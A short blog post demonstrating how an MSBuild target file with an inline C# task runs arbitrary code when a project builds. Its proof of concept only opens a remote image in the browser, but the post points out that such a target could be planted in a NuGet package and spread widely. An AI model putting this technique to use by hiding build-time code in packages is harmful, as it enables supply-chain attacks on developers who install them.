---
title:  "Write a target file to execute arbitrary code"
---

You can read an [introduction about the MSBuild scripting language](https://andreiepure.ro/2022/11/01/msbuild-vocabulary.html).

Let's write a target file that opens a browser when being executed.

```
<?xml version="1.0" encoding="utf-8"?>
<Project>
	<UsingTask
	  TaskName="OpenRemoteImage"
	  TaskFactory="RoslynCodeTaskFactory"
	  AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll" >
		<ParameterGroup />
		<Task>
			<Using Namespace="System.Diagnostics"/>
			<Code Type="Fragment" Language="cs">
<![CDATA[
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "https://raw.githubusercontent.com/andreiepure/andreiepure.github.io/master/assets/Evil_Hacker.jpg";
            startInfo.UseShellExecute = true;
            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();
]]>
			</Code>
		</Task>
	</UsingTask>
	<Target Name="ExecuteArbitraryCode" AfterTargets="CoreBuild">
		<Warning Text="Arbitrary code executed from this task."/>
		<OpenRemoteImage/>
	</Target>
</Project>
```

This target file:
- defines a Task inside of it (`UsingTask`) and opens an URL with the default browser. This is a plain C# program, so you can write anything inside (whatever allows the build process to execute).
  - "RoslynCodeTaskFactory" allows creating inline tasks (otherwise, an "AssemblyFile" attribute pointing to the task DLL should be used instead the "TaskFactory attribute)
- defines a target which writes an warning message to the build output and invokes the defined task

Save the above inside a "foo.target" and then execute

```
dotnet msbuild foo.target
```

and you will see the warning in the build output an the browser window being opened.

# What's next?

You can insert this malicious target file in a NuGet file and distribute to the entire world. I will write more about that in a future article.
